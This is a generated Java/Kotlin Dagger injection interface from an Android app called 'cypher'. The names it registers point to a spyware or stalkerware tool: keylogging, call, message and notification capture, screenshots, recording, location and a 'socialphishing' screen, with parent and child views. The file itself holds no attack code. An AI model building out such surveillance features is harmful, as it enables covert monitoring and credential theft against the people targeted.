package com.github.sdt.cypher.di.component;

import java.lang.System;

/**
 * Created by luis rafael on 8/03/18.
 */
@kotlin.Metadata(mv = {1, 4, 2}, bv = {1, 0, 3}, k = 1, d1 = {"\u0000j\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\bg\u0018\u00002\u00020\u0001J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0004\u001a\u00020\u0005H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0006\u001a\u00020\u0007H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\b\u001a\u00020\tH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\n\u001a\u00020\u000bH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\f\u001a\u00020\rH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u000e\u001a\u00020\u000fH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0010\u001a\u00020\u0011H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0012\u001a\u00020\u0013H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0014\u001a\u00020\u0015H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0016\u001a\u00020\u0017H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0018\u001a\u00020\u0019H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u001a\u001a\u00020\u001bH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u001c\u001a\u00020\u001dH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u001e\u001a\u00020\u001fH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010 \u001a\u00020!H&\u00a8\u0006\""}, d2 = {"Lcom/github/sdt/cypher/di/component/ActivityComponent;", "", "inject", "", "loginActivity", "Lcom/github/sdt/cypher/ui/activities/login/LoginActivity;", "mainChildActivity", "Lcom/github/sdt/cypher/ui/activities/mainchild/MainChildActivity;", "mainParentActivity", "Lcom/github/sdt/cypher/ui/activities/mainparent/MainParentActivity;", "registerActivity", "Lcom/github/sdt/cypher/ui/activities/register/RegisterActivity;", "socialActivityM", "Lcom/github/sdt/cypher/ui/activities/socialphishing/SocialActivityM;", "callsFragment", "Lcom/github/sdt/cypher/ui/fragments/calls/CallsFragment;", "callhistory", "Lcom/github/sdt/cypher/ui/fragments/calls/FragmentCallhistory;", "keysFragment", "Lcom/github/sdt/cypher/ui/fragments/keylog/KeysFragment;", "mapsFragment", "Lcom/github/sdt/cypher/ui/fragments/maps/MapsFragment;", "messageFragment", "Lcom/github/sdt/cypher/ui/fragments/message/MessageFragment;", "notifyMessageFragment", "Lcom/github/sdt/cypher/ui/fragments/notifications/NotifyMessageFragment;", "photoFragment", "Lcom/github/sdt/cypher/ui/fragments/photo/PhotoFragment;", "recordingFragment", "Lcom/github/sdt/cypher/ui/fragments/recording/RecordingFragment;", "screenshot", "Lcom/github/sdt/cypher/ui/fragments/screenshot/FragmentScreenshot;", "socialFragment", "Lcom/github/sdt/cypher/ui/fragments/social/SocialFragment;", "app_debug"})
@dagger.Component(dependencies = {com.github.sdt.cypher.di.component.AppComponent.class}, modules = {com.github.sdt.cypher.di.module.ActivityModule.class})
@com.github.sdt.cypher.di.PerActivity()
public abstract interface ActivityComponent {
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.activities.login.LoginActivity loginActivity);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.activities.register.RegisterActivity registerActivity);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.activities.mainparent.MainParentActivity mainParentActivity);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.activities.mainchild.MainChildActivity mainChildActivity);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.activities.socialphishing.SocialActivityM socialActivityM);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.fragments.maps.MapsFragment mapsFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.fragments.calls.CallsFragment callsFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.fragments.message.MessageFragment messageFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.fragments.photo.PhotoFragment photoFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.fragments.keylog.KeysFragment keysFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.fragments.social.SocialFragment socialFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.fragments.recording.RecordingFragment recordingFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.fragments.notifications.NotifyMessageFragment notifyMessageFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.fragments.screenshot.FragmentScreenshot screenshot);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.github.sdt.cypher.ui.fragments.calls.FragmentCallhistory callhistory);
}